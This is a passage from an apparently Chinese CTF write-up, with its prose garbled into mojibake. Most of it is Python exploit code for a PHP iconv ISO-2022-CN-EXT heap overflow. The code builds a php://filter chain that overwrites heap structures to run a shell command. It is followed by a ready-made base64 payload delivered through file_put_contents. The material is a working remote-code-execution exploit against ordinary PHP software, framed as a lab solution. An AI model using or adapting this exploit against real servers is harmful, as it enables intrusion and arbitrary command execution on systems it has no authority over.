</span></span><span class="line"><span class="cl">    <span class="n">ADDR_FAKE_BIN</span> <span class="o">=</span> <span class="n">ADDR_FREE_SLOT</span> <span class="o">-</span> <span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">CS</span> <span class="o">=</span> <span class="mh">0x100</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Pad needs to stay at size 0x100 at every step</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad_size</span> <span class="o">=</span> <span class="n">CS</span> <span class="o">-</span> <span class="mh">0x18</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="n">pad_size</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step1_size</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="n">step1_size</span>
</span></span><span class="line"><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step1</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &#34;crash&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step2_size</span> <span class="o">=</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step2_size</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;0</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">step2_size</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDR_FAKE_BIN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step3_size</span> <span class="o">=</span> <span class="n">CS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="n">step3_size</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span> <span class="o">==</span> <span class="n">CS</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step3_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">BUG</span><span class="p">))</span> <span class="o">+</span> <span class="n">BUG</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span> <span class="o">==</span> <span class="n">CS</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step4_size</span> <span class="o">=</span> <span class="n">CS</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;=00&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step4_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4_pwn</span> <span class="o">=</span> <span class="n">ptr_bucket</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x200000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># free_slot</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">ADDR_CUSTOM_HEAP</span><span class="p">,</span>  <span class="c1"># 0x18</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">ADDR_HEAP</span><span class="p">,</span>  <span class="c1"># 0x140</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">size</span><span class="o">=</span><span class="n">CS</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step4_custom_heap</span> <span class="o">=</span> <span class="n">ptr_bucket</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">ADDR_EMALLOC</span><span class="p">,</span> <span class="n">ADDR_EFREE</span><span class="p">,</span> <span class="n">ADDR_EREALLOC</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step4_use_custom_heap_size</span> <span class="o">=</span> <span class="mh">0x140</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;kill -9 $PPID; </span><span class="si">{</span><span class="n">COMMAND</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">sleep</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">COMMAND</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;sleep </span><span class="si">{</span><span class="n">sleep</span><span class="si">}</span><span class="s2">; </span><span class="si">{</span><span class="n">COMMAND</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">COMMAND</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">step4_use_custom_heap_size</span>
</span></span><span class="line"><span class="cl">    <span class="p">),</span> <span class="sa">f</span><span class="s2">&#34;Command too big (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)</span><span class="si">}</span><span class="s2">), it must be strictly inferior to </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">step4_use_custom_heap_size</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">COMMAND</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">step4_use_custom_heap_size</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">COMMAND</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">qpe</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pages</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">step4</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">step4_pwn</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">step4_custom_heap</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">step4_use_custom_heap</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">step3_overflow</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">pad</span> <span class="o">*</span> <span class="n">padding</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">step1</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">step2_write_ptr</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">step2</span> <span class="o">*</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">resource</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">compress</span><span class="p">(</span><span class="n">pages</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">resource</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">resource</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">resource</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;data:text/plain;base64,</span><span class="si">{</span><span class="n">resource</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Create buckets</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;zlib.inflate&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;zlib.inflate&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Step 0: Setup heap</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Step 1: Reverse FL order</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Step 2: Put fake pointer and make FL order back to normal</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Step 3: Trigger overflow</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;dechunk&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;convert.quoted-printable-decode&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;convert.iconv.latin1.latin1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">=</span> <span class="s2">&#34;|&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">filters</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;php://filter/read=</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s2">/resource=</span><span class="si">{</span><span class="n">resource</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;%2b&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">maps_path</span> <span class="o">=</span> <span class="s1">&#39;./maps&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;/readflag &gt; /var/www/html/flag&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep_time</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">maps_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="s2">&#34;[-]no maps file&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">regions</span> <span class="o">=</span> <span class="n">get_regions</span><span class="p">(</span><span class="n">maps_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">heap</span><span class="p">,</span> <span class="n">libc_info</span> <span class="o">=</span> <span class="n">get_symbols_and_addresses</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_path</span> <span class="o">=</span> <span class="n">libc_info</span><span class="o">.</span><span class="n">path</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]download: &#34;</span><span class="o">+</span><span class="n">libc_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_path</span> <span class="o">=</span> <span class="s1">&#39;./libc.so.6&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">libc_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="s2">&#34;[-]no libc file&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_info</span><span class="o">.</span><span class="n">start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">build_exploit_path</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">heap</span><span class="p">,</span> <span class="n">sleep_time</span><span class="p">,</span> <span class="n">padding</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]payload:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-lilctf/image-20250907210844936.png"
	width="1852"
	height="983"
	srcset="/p/2025-lilctf/image-20250907210844936_hu_d2a5ab9e2fc1b94e.png 480w, /p/2025-lilctf/image-20250907210844936_hu_af18b4d4befc0b8a.png 1024w"
	loading="lazy"
	
		alt="image-20250907210844936"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="452px"
	
></p>
<p>ä¹‹å‰éƒ½æ˜¯ç”¨file_get_contentsè§¦å‘è¿™ä¸ªcveï¼Œä½†æ˜¯è¿™é‡Œåªèƒ½ç”¨file_put_contentsï¼Œæ€ä¹ˆæ‰“?è§‚å¯Ÿè¿™paylaodå°±æ˜¯ä¸€ä¸ªä¼ªåè®®ï¼Œè€Œfile_put_contentså‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æ”¹ä¸€ä¸‹pyload,å‰é¢ä¼ªåè®®è¯­å¥è¯»1.txtï¼ˆå¥—ä¸€ä¸ªbase64è§£ç ï¼‰ï¼Œåé¢æ‰§è¡Œå‘½ä»¤è¯­å¥å°±ä¼šå†™å…¥1.txt</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="o">=</span><span class="nv">$data</span><span class="o">=</span><span class="s1">&#39;e3vXdt1rMwG2gGubpU5d2/rU6ejp82s3syr233KbFXLTcVeO3u8TATWak0IY8xpsPsgI3O8wS/WWO7Q2i5UBL0jgOl10JDQvfGVyWP7G61HPxE6yMeLXMePIJpnCqbdDX824Gv1m67Sdrpsc8WtgUNuo4x7ztGyqVdpXseq1qXkTcwQIWHGq9uYjra9apWey3vo3vH8ctl%2bm5sePLW9Lb9pf/bvx3frr/2r%2br9%2bXMWljX/zV9z8NlSftZyfghH/v5UyrKm%2b7SW4u7f4b%2bf14cX1u%2bL5vz3/HZcvPL7rz/frf9%2bu/f33/P0b%2b5Hoe/Cb9P/X381eGT7%2bfv2Z88l3%2b%2bJvjUr8/77Pfd1c%2bv9bmdd3q37U339//0nzc/Pfj0r2/c%2bff23f7/frXCXfvZ8m/zo6/rt%2bd//7357Lac5vsr/39uMMv5tfjU7/T6/4/n%2bVebxj%2b7fHz6ROP9%2bfWP4u8H3v/67/rl/e/z7ddz/o48kVbYgzQm%2bb43daQqXNaLHwlKDKzp8z8%2b%2b/0%2bYk5/ARCpu1zR4/p4q1y0VM8XS7VjyoeVTyqmM6KG17qbj3ms313z%2b7a3k0unSnSBMz2yV9pmrbrbuqdt9lTVL1UbhNQnlDlvdbw8lu9x3nxi3UClW6yEVB/OeoVsBD5aBr7LToubwr/R%2befbz%2bvt58qJLiNGb/GA1um7ToamlXjO/1v2OKaDR0bZAnYtGzrFd11QY%2bzd73ZLvW02fWIPAA=&#39;</span><span class="p">;</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;php://filter/write=convert.base64-decode|zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=1.txt&#39;</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025-lilctf/image-20250907220146464.png"
	width="1514"
	height="582"
	srcset="/p/2025-lilctf/image-20250907220146464_hu_db88b2d1de450e32.png 480w, /p/2025-lilctf/image-20250907220146464_hu_86677668cd4b6954.png 1024w"
	loading="lazy"
	
		alt="image-20250907220146464"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="624px"
	
></p>
<p>è®¿é—®å¾—flag</p>
<p><img src="/p/2025-lilctf/image-20250907220152844.png"
	width="1615"
	height="295"
	srcset="/p/2025-lilctf/image-20250907220152844_hu_31d6d231891203c0.png 480w, /p/2025-lilctf/image-20250907220152844_hu_7c2d1a11b4acdb4f.png 1024w"
	loading="lazy"
	
		alt="image-20250907220152844"
	
	
		class="gallery-image" 
		data-flex-grow="547"
		data-flex-basis="1313px"
	
></p>
<p>ï¼ˆwcäº†ï¼Œæœ¬åœ°ç¼–è¾‘å™¨å› ä¸ºæ ¼å¼é—®é¢˜paylaodä¸­é—´ä¼šå¦èµ·ä¸€è¡Œï¼Œåœ¨bpä¼šå½¢æˆä¸€ä¸ªæ¢è¡Œï¼Œæå¾—æˆ‘æµªè´¹ä¸å°‘æ—¶é—´ï¼‰</p>
<h2 id="warm-up-æ¥åŠ›turboflash">[WARM UP] æ¥åŠ›ï¼TurboFlash
